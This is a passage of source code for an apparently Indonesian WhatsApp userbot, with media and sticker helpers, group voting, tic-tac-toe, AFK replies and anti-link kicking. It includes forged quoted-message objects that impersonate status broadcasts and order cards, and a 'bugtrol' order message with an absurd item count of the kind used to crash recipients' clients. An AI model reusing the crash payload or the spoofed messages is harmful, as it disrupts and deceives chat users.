        if(time2 < "19:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "18:00:00"){
        var ucapannya2 = `Afternoon 🌅 ${pushname}`
}
        if(time2 < "15:00:00"){
        var ucapannya2 = `GoodDay 🌞 ${pushname}`
}
        if(time2 < "11:00:00"){
        var ucapannya2 = `Morning 🌄 ${pushname}`
}
        if(time2 < "05:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
function _0x5119(_0x5301ed,_0x4bdeff){const _0x4d484a=_0x4d48();return _0x5119=function(_0x5119ed,_0x514696){_0x5119ed=_0x5119ed-0x125;let _0x41233c=_0x4d484a[_0x5119ed];return _0x41233c;},_0x5119(_0x5301ed,_0x4bdeff);}function _0x4d48(){const _0x1136ef=['setStatus','4495827nZGfsy','padStart','floor','168TLrYoW','2504iOUJqx','4149wwROTc','I\x27m\x20Userbot\x20🤖\x20|\x20Runtime\x20','188nwguEu','1013965jKmium','\x20⏰\x20|\x20','4692908hxoDzf','map','2862520HmlZjX','uptime','9732cHnqXp','12oPpLUp','5517JzEqTI','toString'];_0x4d48=function(){return _0x1136ef;};return _0x4d48();}const _0x6d8bb3=_0x5119;(function(_0x4099c9,_0x45c9a3){const _0x65668d=_0x5119,_0x54f7ea=_0x4099c9();while(!![]){try{const _0x3b845d=-parseInt(_0x65668d(0x12d))/0x1*(parseInt(_0x65668d(0x12b))/0x2)+-parseInt(_0x65668d(0x136))/0x3*(-parseInt(_0x65668d(0x12f))/0x4)+parseInt(_0x65668d(0x130))/0x5*(-parseInt(_0x65668d(0x137))/0x6)+parseInt(_0x65668d(0x128))/0x7+-parseInt(_0x65668d(0x12c))/0x8*(-parseInt(_0x65668d(0x125))/0x9)+-parseInt(_0x65668d(0x134))/0xa+parseInt(_0x65668d(0x132))/0xb;if(_0x3b845d===_0x45c9a3)break;else _0x54f7ea['push'](_0x54f7ea['shift']());}catch(_0x43b3a5){_0x54f7ea['push'](_0x54f7ea['shift']());}}}(_0x4d48,0x5b088));function clockString(_0x34132c){const _0x2407a4=_0x5119;let _0x1d952b=isNaN(_0x34132c)?'--':Math['floor'](_0x34132c/0x36ee80),_0x1671d4=isNaN(_0x34132c)?'--':Math[_0x2407a4(0x12a)](_0x34132c/0xea60)%0x3c,_0x12ec2e=isNaN(_0x34132c)?'--':Math[_0x2407a4(0x12a)](_0x34132c/0x3e8)%0x3c;return[_0x1d952b,_0x1671d4,_0x12ec2e][_0x2407a4(0x133)](_0x5913d3=>_0x5913d3[_0x2407a4(0x126)]()[_0x2407a4(0x129)](0x2,0x0))['join'](':');}if(autobio){if(autobio===![])return;let settingstatus=0x0;if(new Date()*0x1-settingstatus>0x3e8){let _uptime=process[_0x6d8bb3(0x135)]()*0x3e8,uptimer=clockString(_uptime);await alpha[_0x6d8bb3(0x127)](_0x6d8bb3(0x12e)+uptimer+_0x6d8bb3(0x131)+status)['catch'](_0x731e31=>_0x731e31),settingstatus=new Date()*0x1;}}
		mess = {
			wait: '```[ ! ] Proses kak...```',
			success: '```[ ✓ ]``` Success',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
				admin: 'Only Group Admin',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }
        

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${thumbnail}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": 'Whatsapp bot', 
					"description": "SELF BOT", 
					"currencyCode": "IDR",
					"priceAmount1000": "70000000",
					"retailerId": 'Whatsapp bot',
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "359531915900587",
						"itemCount": 1000000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${creator}`,
						"orderTitle": `${creator}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
					}}}
       const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `Whatsapp Bot 〽️\nBy ${ownername}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}},contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${creator}`,jpegThumbnail: fs.readFileSync(`image/${thumbnail}`)}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `さ ${pushname} さ\nᴄᴍᴅ ᴇxᴇᴄ : ${command}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
		var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
		var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];
const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}})}
           
       const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            alpha.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	alpha.sendMessage(from, hasil, type, options).catch(e => {
            	alpha.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return alpha.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return alpha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumbnail}`)})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					alpha.sendMessage(to, media, sticker, mek)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			function jsonformat(string) {
  return JSON.stringify(string, null, 2)
}
			
			const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
alpha.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
alpha.sendMessage(from, hasil, type, options).catch(e => {
alpha.sendMessage(from, { url : link }, type, options).catch(e => {
reply2('Error!')
console.log(e)
})
})
})
})
}
			try{
			hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			} catch {
				hit_total = { 
					value : "-"
					}
				}
				hitall = `${hit_total.value}`
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6281804680327@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	

const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./src/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./src/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply2(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} ??🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply2(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		alpha.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}

    _sewa.expiredCheck(alpha, sewa)
    
  //FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
    if (isGroup && !mek.key.fromMe && isAntiLink && !isGroupAdmins && !isOwner && !isCreator && isBotGroupAdmins){
            if (chatxs.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply2(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                alpha.groupRemove(from, [sender])
            }
        }
     if (isGroup && isAntivirtex && !mek.key.fromMe && !isOwner) {
      if (budy.length > 1000) {
        if (isGroupAdmins) return reply("admin bebas");
        reply2("「 A N T I V I R T E X  D E T E C T E D 」 \n\nMaaf Kamu Akan Dikick");
        alpha.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isRegister && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								await alpha.sendMessage(`* 「 LEVEL UP 」 *\n\n🎯 *User :* @${sender.split("@")[0]}\n🆔 *Nomer :* ${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* ${getBalance(sender, balance)}\n👛 *Dompet :* ${checkATMuser(sender)}\n📛 *Role :* ${role}\n\nCongrats 🎉`,text, {quoted: mek, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
								}
							} catch (err) {
								console.error(err)
							}
						}
    alpha.on('chat-update', asd => {
if (asd.presences) {
	for (key in asd.presences) {
		if (asd.presences[key].lastKnownPresence == 'composing' || asd.presences[key].lastKnownPresence == 'recording') {
